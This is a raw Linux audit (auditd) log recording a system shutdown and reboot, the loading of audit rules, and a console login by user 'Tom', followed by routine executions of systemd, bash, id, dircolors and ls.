type=SERVICE_STOP msg=audit(1789397219.969:94): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=getty@tty1 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789397219.973:95): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=ssh comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789397219.981:96): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-random-seed comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789397220.025:97): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789397220.077:98): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-logind comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789397220.097:99): prog-id=9 op=UNLOAD
type=SERVICE_STOP msg=audit(1789397220.105:100): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-user-sessions comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789397220.109:101): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user-runtime-dir@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789397220.129:102): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=dbus comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SYSTEM_SHUTDOWN msg=audit(1789397220.153:103): pid=691 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg=' comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789397220.165:104): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-binfmt comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789397220.169:105): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789397220.169:106): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=networking comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=DAEMON_END msg=audit(1789397220.175:3902): op=terminate auid=0 uid=0 ses=4294967295 pid=1 subj=unconfined res=successAUID="root" UID="root"
type=DAEMON_START msg=audit(1789397252.483:9155): op=start ver=3.0.9 format=enriched kernel=6.1.0-49-amd64 auid=4294967295 pid=470 uid=0 ses=4294967295 subj=unconfined  res=successAUID="unset" UID="root"
type=SERVICE_START msg=audit(1789397252.483:13): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=vgauth comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789397252.483:14): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=open-vm-tools comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789397252.547:15): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-timesyncd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=CONFIG_CHANGE msg=audit(1789397252.575:16): op=set audit_backlog_limit=8192 old=64 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789397252.575:16): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffde6d32ee0 a2=3c a3=0 items=0 ppid=476 pid=500 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789397252.575:16): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789397252.575:17): op=set audit_failure=1 old=1 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789397252.575:17): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffde6d32ee0 a2=3c a3=0 items=0 ppid=476 pid=500 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789397252.575:17): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789397252.575:18): op=set audit_backlog_wait_time=60000 old=15000 auid=4294967295 ses=4294967295 subj=unconfined res=1AUID="unset"
type=SYSCALL msg=audit(1789397252.575:18): arch=c000003e syscall=44 success=yes exit=60 a0=3 a1=7ffde6d32ee0 a2=3c a3=0 items=0 ppid=476 pid=500 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789397252.575:18): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=CONFIG_CHANGE msg=audit(1789397252.575:19): auid=4294967295 ses=4294967295 subj=unconfined op=add_rule key="tom_exe" list=4 res=1AUID="unset"
type=SYSCALL msg=audit(1789397252.575:19): arch=c000003e syscall=44 success=yes exit=1064 a0=3 a1=7ffde6d32fa0 a2=428 a3=0 items=0 ppid=476 pid=500 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="auditctl" exe="/usr/sbin/auditctl" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=sendto AUID="unset" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789397252.575:19): proctitle=2F7362696E2F617564697463746C002D52002F6574632F61756469742F61756469742E72756C6573
type=SERVICE_START msg=audit(1789397252.575:20): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=auditd comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SYSTEM_BOOT msg=audit(1789397252.615:21): pid=507 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg=' comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789397252.619:22): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789397252.631:23): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=cron comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=BPF msg=audit(1789397252.635:24): prog-id=9 op=LOAD
type=BPF msg=audit(1789397252.639:25): prog-id=10 op=LOAD
type=BPF msg=audit(1789397252.639:26): prog-id=11 op=LOAD
type=SERVICE_START msg=audit(1789397252.683:27): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=dbus comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789397252.719:28): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-logind comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789397252.775:29): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=networking comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789397256.206:30): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-user-sessions comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789397256.206:31): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=getty@tty1 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789397256.262:32): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=e2scrub_reap comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789397256.262:33): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=e2scrub_reap comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789397256.278:34): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=ssh comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SYSTEM_RUNLEVEL msg=audit(1789397256.290:35): pid=674 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='old-level=N new-level=5 comm="systemd-update-utmp" exe="/usr/lib/systemd/systemd-update-utmp" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_START msg=audit(1789397256.290:36): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp-runlevel comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=SERVICE_STOP msg=audit(1789397256.290:37): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=systemd-update-utmp-runlevel comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_AUTH msg=audit(1789397280.370:38): pid=612 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:authentication grantors=pam_permit acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789397280.370:39): pid=612 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789397280.370:40): pid=612 uid=0 subj=unconfined old-auid=4294967295 auid=1000 tty=tty1 old-ses=4294967295 ses=1 res=1UID="root" OLD-AUID="unset" AUID="Tom"
type=SYSCALL msg=audit(1789397280.370:40): arch=c000003e syscall=1 success=yes exit=4 a0=3 a1=7ffc6da08cb0 a2=4 a3=7ffc6da089c4 items=0 ppid=1 pid=612 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=tty1 ses=1 comm="login" exe="/usr/bin/login" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="Tom" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789397280.370:40): proctitle=2F62696E2F6C6F67696E002D70002D2D
type=SERVICE_START msg=audit(1789397280.442:41): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user-runtime-dir@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_ACCT msg=audit(1789397280.450:42): pid=763 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:accounting grantors=pam_permit acct="Tom" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=CRED_ACQ msg=audit(1789397280.450:43): pid=763 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="Tom" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=LOGIN msg=audit(1789397280.450:44): pid=763 uid=0 subj=unconfined old-auid=4294967295 auid=1000 tty=(none) old-ses=4294967295 ses=2 res=1UID="root" OLD-AUID="unset" AUID="Tom"
type=SYSCALL msg=audit(1789397280.450:44): arch=c000003e syscall=1 success=yes exit=4 a0=7 a1=7ffda2baf990 a2=4 a3=7ffda2baf6a4 items=0 ppid=1 pid=763 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=2 comm="(systemd)" exe="/usr/lib/systemd/systemd" subj=unconfined key=(null)ARCH=x86_64 SYSCALL=write AUID="Tom" UID="root" GID="root" EUID="root" SUID="root" FSUID="root" EGID="root" SGID="root" FSGID="root"
type=PROCTITLE msg=audit(1789397280.450:44): proctitle="(systemd)"
type=USER_START msg=audit(1789397280.450:45): pid=763 uid=0 auid=1000 ses=2 subj=unconfined msg='op=PAM:session_open grantors=pam_selinux,pam_selinux,pam_loginuid,pam_limits,pam_permit,pam_unix,pam_keyinit,pam_systemd acct="Tom" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="Tom"
type=SYSCALL msg=audit(1789397280.454:46): arch=c000003e syscall=59 success=yes exit=0 a0=55afe9999240 a1=55afe9b08120 a2=55afe9af3130 a3=0 items=3 ppid=1 pid=763 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=2 comm="systemd" exe="/usr/lib/systemd/systemd" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397280.454:46): argc=2 a0="/lib/systemd/systemd" a1="--user"
type=CWD msg=audit(1789397280.454:46): cwd="/"
type=PATH msg=audit(1789397280.454:46): item=0 name="/lib/systemd/systemd" inode=396257 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397280.454:46): item=1 name="/lib/systemd/systemd" inode=396257 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397280.454:46): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397280.454:46): proctitle="(systemd)"
type=SYSCALL msg=audit(1789397280.486:47): arch=c000003e syscall=59 success=yes exit=0 a0=558624c93070 a1=7fffc5a4c450 a2=7fffc5a4cd00 a3=0 items=3 ppid=765 pid=766 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=2 comm="30-systemd-envi" exe="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397280.486:47): argc=1 a0="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator"
type=CWD msg=audit(1789397280.486:47): cwd="/"
type=PATH msg=audit(1789397280.486:47): item=0 name="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator" inode=397675 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397280.486:47): item=1 name="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator" inode=397675 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397280.486:47): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397280.486:47): proctitle="/usr/lib/systemd/user-environment-generators/30-systemd-environment-d-generator"
type=SYSCALL msg=audit(1789397280.498:48): arch=c000003e syscall=59 success=yes exit=0 a0=558624c96a90 a1=7fffc5a4c4c0 a2=558624c96b30 a3=21f3dfe412f8fac8 items=3 ppid=767 pid=768 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=2 comm="systemd-xdg-aut" exe="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397280.498:48): argc=4 a0="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" a1="/run/user/1000/systemd/generator" a2="/run/user/1000/systemd/generator.early" a3="/run/user/1000/systemd/generator.late"
type=CWD msg=audit(1789397280.498:48): cwd="/"
type=PATH msg=audit(1789397280.498:48): item=0 name="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" inode=397676 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397280.498:48): item=1 name="/usr/lib/systemd/user-generators/systemd-xdg-autostart-generator" inode=397676 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397280.498:48): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397280.498:48): proctitle=2F7573722F6C69622F73797374656D642F757365722D67656E657261746F72732F73797374656D642D7864672D6175746F73746172742D67656E657261746F72002F72756E2F757365722F313030302F73797374656D642F67656E657261746F72002F72756E2F757365722F313030302F73797374656D642F67656E65726174
type=SYSCALL msg=audit(1789397280.594:49): arch=c000003e syscall=59 success=yes exit=0 a0=558624cb5b90 a1=558624ca7a70 a2=558624c99320 a3=0 items=3 ppid=763 pid=769 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=(none) ses=2 comm="systemctl" exe="/usr/bin/systemctl" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397280.594:49): argc=4 a0="/bin/systemctl" a1="--user" a2="set-environment" a3="DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus"
type=CWD msg=audit(1789397280.594:49): cwd="/home/Tom"
type=PATH msg=audit(1789397280.594:49): item=0 name="/bin/systemctl" inode=393580 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397280.594:49): item=1 name="/bin/systemctl" inode=393580 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397280.594:49): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397280.594:49): proctitle=2F62696E2F73797374656D63746C002D2D75736572007365742D656E7669726F6E6D656E7400444255535F53455353494F4E5F4255535F414444524553533D756E69783A706174683D2F72756E2F757365722F313030302F627573
type=SERVICE_START msg=audit(1789397280.610:50): pid=1 uid=0 auid=4294967295 ses=4294967295 subj=unconfined msg='unit=user@1000 comm="systemd" exe="/usr/lib/systemd/systemd" hostname=? addr=? terminal=? res=success'UID="root" AUID="unset"
type=USER_START msg=audit(1789397280.618:51): pid=612 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:session_open grantors=pam_selinux,pam_loginuid,pam_selinux,pam_env,pam_env,pam_limits,pam_lastlog,pam_mail,pam_keyinit,pam_permit,pam_unix,pam_systemd acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="Tom"
type=CRED_ACQ msg=audit(1789397280.618:52): pid=612 uid=0 auid=1000 ses=1 subj=unconfined msg='op=PAM:setcred grantors=pam_permit acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="Tom"
type=USER_LOGIN msg=audit(1789397280.618:53): pid=612 uid=0 auid=1000 ses=1 subj=unconfined msg='op=login acct="Tom" exe="/usr/bin/login" hostname=LT-TAinsworth addr=? terminal=/dev/tty1 res=success'UID="root" AUID="Tom"
type=SYSCALL msg=audit(1789397280.622:54): arch=c000003e syscall=59 success=yes exit=0 a0=56350fa72c70 a1=7ffc6da08930 a2=56350fa72db0 a3=0 items=3 ppid=612 pid=770 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="bash" exe="/usr/bin/bash" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397280.622:54): argc=1 a0="-bash"
type=CWD msg=audit(1789397280.622:54): cwd="/home/Tom"
type=PATH msg=audit(1789397280.622:54): item=0 name="/bin/bash" inode=393054 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397280.622:54): item=1 name="/bin/bash" inode=393054 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397280.622:54): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397280.622:54): proctitle="-bash"
type=SYSCALL msg=audit(1789397280.626:55): arch=c000003e syscall=59 success=yes exit=0 a0=5616597db910 a1=5616597dc450 a2=5616597d9060 a3=8 items=3 ppid=770 pid=771 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="id" exe="/usr/bin/id" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397280.626:55): argc=2 a0="id" a1="-u"
type=CWD msg=audit(1789397280.626:55): cwd="/home/Tom"
type=PATH msg=audit(1789397280.626:55): item=0 name="/usr/bin/id" inode=393398 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397280.626:55): item=1 name="/usr/bin/id" inode=393398 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397280.626:55): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397280.626:55): proctitle=6964002D75
type=SYSCALL msg=audit(1789397280.650:56): arch=c000003e syscall=59 success=yes exit=0 a0=5616598a7e30 a1=5616597d9800 a2=5616597dc390 a3=0 items=3 ppid=770 pid=772 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="dircolors" exe="/usr/bin/dircolors" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397280.650:56): argc=2 a0="dircolors" a1="-b"
type=CWD msg=audit(1789397280.650:56): cwd="/home/Tom"
type=PATH msg=audit(1789397280.650:56): item=0 name="/usr/bin/dircolors" inode=393386 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397280.650:56): item=1 name="/usr/bin/dircolors" inode=393386 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PATH msg=audit(1789397280.650:56): item=2 name="/lib64/ld-linux-x86-64.so.2" inode=393987 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
type=PROCTITLE msg=audit(1789397280.650:56): proctitle=646972636F6C6F7273002D62
type=SYSCALL msg=audit(1789397282.930:57): arch=c000003e syscall=59 success=yes exit=0 a0=5616598bb4f0 a1=561659802d80 a2=5616597dc390 a3=3e8b3e06fdcb648 items=3 ppid=770 pid=774 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=tty1 ses=1 comm="ls" exe="/usr/bin/ls" subj=unconfined key="tom_exe"ARCH=x86_64 SYSCALL=execve AUID="Tom" UID="Tom" GID="Tom" EUID="Tom" SUID="Tom" FSUID="Tom" EGID="Tom" SGID="Tom" FSGID="Tom"
type=EXECVE msg=audit(1789397282.930:57): argc=2 a0="ls" a1="--color=auto"
type=CWD msg=audit(1789397282.930:57): cwd="/home/Tom"
type=PATH msg=audit(1789397282.930:57): item=0 name="/usr/bin/ls" inode=393357 dev=08:02 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0OUID="root" OGID="root"
